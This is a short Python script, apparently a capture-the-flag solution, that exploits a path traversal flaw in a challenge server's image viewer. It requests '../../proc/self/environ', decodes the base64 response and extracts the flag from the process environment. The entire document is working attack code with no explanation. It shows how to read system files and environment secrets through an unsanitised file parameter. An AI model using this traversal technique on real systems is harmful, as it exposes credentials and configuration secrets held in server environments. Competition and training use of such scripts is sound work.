#!/usr/bin/env python3
import base64
import re
import requests

params = {'image': '../../proc/self/environ'}
response = requests.get('http://1ce0608f-2c55-43e1-9afe-278a540e5787.challs.n00bzunit3d.xyz:8080/view', params=params)

encoded_environ = re.search('image/jpeg;base64, ([A-Za-z0-9+/=]+)', response.text).group(1)
environ = base64.b64decode(encoded_environ)

print(re.search(b'n00bz{.+}', environ).group(0))
